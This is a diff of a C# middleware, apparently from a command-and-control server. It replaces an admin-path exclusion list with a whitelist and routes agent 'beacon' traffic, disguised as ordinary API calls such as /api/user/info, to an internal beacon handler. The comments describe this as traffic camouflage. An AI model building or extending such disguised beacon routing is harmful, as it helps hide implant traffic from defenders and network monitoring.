@@ -3,46 +3,21 @@ using LibraNextgen.Service.Services;
 namespace LibraNextgen.Service.Middleware;
 
 /// <summary>
-/// 单入口路由（流量伪装 Phase 2）：
-/// 把 profile 配置的入口前缀（如 /api、/index.php）及其后的任意虚假业务路径段
-/// 重写到内部端点 /api/beacon/handle —— 服务端忽略入口之后的路径段
-/// （/api/user/info、/api/orders/123 全部按 /api 前缀路由）。
+/// 单入口路由（流量伪装 Phase 2）。
 ///
-/// 安全边界（重要）：管理员 API 同样位于 /api/* 下，必须排除在入口路由之外，
-/// 否则 /api/auth/* 等管理端点会被误重写。新增管理员 controller 时请同步
-/// 登记到 <see cref="AdminPrefixes"/>。被排除的路径直接放行，由 JWT/RBAC
-/// 中间件保护 —— agent 只有 beacon session token，没有 JWT，天然无法访问。
+/// 路由规则（白名单式，天然免疫管理端点误伤）：
+///   仅当请求路径 == 入口前缀，或 == 入口前缀 + "/" + profile 配置的
+///   path_suffixes 中的某一个时，重写到内部端点 /api/beacon/handle。
+///   其余路径（/api/auth/*、/api/account/* 等全部管理员 API）一律放行，
+///   由 JWT/RBAC 与既有路由处理。
 ///
-/// 旧版 beacon 端点（/api/beacon/*）保持原样，兼容旧 agent。
+/// 这样无需维护"管理前缀排除列表"——任何新增/改名 controller 都不会被误吞；
+/// 入口与后缀集合完全由 profile 配置驱动（agent 侧只从同一列表随机选择）。
+///
+/// 旧版 beacon 端点（/api/beacon/*）不在入口后缀集合内，保持原样兼容旧 agent。
 /// </summary>
 public class BeaconEntryMiddleware
 {
-    /// <summary>管理员 API 前缀（不参与 beacon 入口路由，直接放行给 JWT 保护）。</summary>
-    private static readonly string[] AdminPrefixes =
-    {
-        "/api/auth",
-        "/api/agents",
-        "/api/tasks",
-        "/api/beacon",
-        "/api/files",
-        "/api/screens",
-        "/api/system",
-        "/api/audit",
-        "/api/profiles",
-        "/api/token",
-        "/api/proxy",
-        "/api/events",
-        "/api/access-keys",
-        "/api/accounts",
-        "/api/plugins",
-        "/api/plugin-action",
-        "/api/risk-policy",
-        "/api/media",
-        "/api/other-soft",
-        "/api/server-script",
-        "/api/mcp",
-    };
-
     private readonly RequestDelegate _next;
 
     public BeaconEntryMiddleware(RequestDelegate next)
@@ -54,31 +29,48 @@ public class BeaconEntryMiddleware
     {
         var path = context.Request.Path.Value ?? "/";
 
-        // 管理员 API / 旧 beacon 端点直接放行
-        foreach (var prefix in AdminPrefixes)
+        // 旧 beacon 端点直接放行（兼容旧 agent）
+        if (path.StartsWith("/api/beacon/", StringComparison.OrdinalIgnoreCase))
         {
-            if (path.Equals(prefix, StringComparison.OrdinalIgnoreCase) ||
-                path.StartsWith(prefix + "/", StringComparison.OrdinalIgnoreCase))
-            {
-                await _next(context);
-                return;
-            }
+            await _next(context);
+            return;
         }
 
         var profile = await profileService.GetActiveProfileAsync();
         string entryPath;
+        List<string> suffixes;
         if (profile is Profiles.ConfigurableProfile cp)
         {
             entryPath = "/" + cp.Config.EntryPath.TrimStart('/');
+            suffixes = cp.Config.PathSuffixes ?? new();
         }
         else
         {
             entryPath = "/api"; // DefaultProfile 固定值
+            suffixes = new List<string>
+            {
+                "user/info", "orders/list", "profile", "settings",
+                "notifications", "messages/unread",
+            };
         }
 
-        // 入口前缀命中（含精确匹配与 /entry/xxx 后缀）
-        if (string.Equals(path, entryPath, StringComparison.OrdinalIgnoreCase) ||
-            path.StartsWith(entryPath + "/", StringComparison.OrdinalIgnoreCase))
+        // 白名单匹配：入口精确 + 入口/已知业务后缀
+        var matched = path.Equals(entryPath, StringComparison.OrdinalIgnoreCase);
+        if (!matched)
+        {
+            var prefix = entryPath.TrimEnd('/') + "/";
+            foreach (var s in suffixes)
+            {
+                var candidate = prefix + s.TrimStart('/');
+                if (path.Equals(candidate, StringComparison.OrdinalIgnoreCase))
+                {
+                    matched = true;
+                    break;
+                }
+            }
+        }
+
+        if (matched)
         {
             context.Request.Path = "/api/beacon/handle";
         }
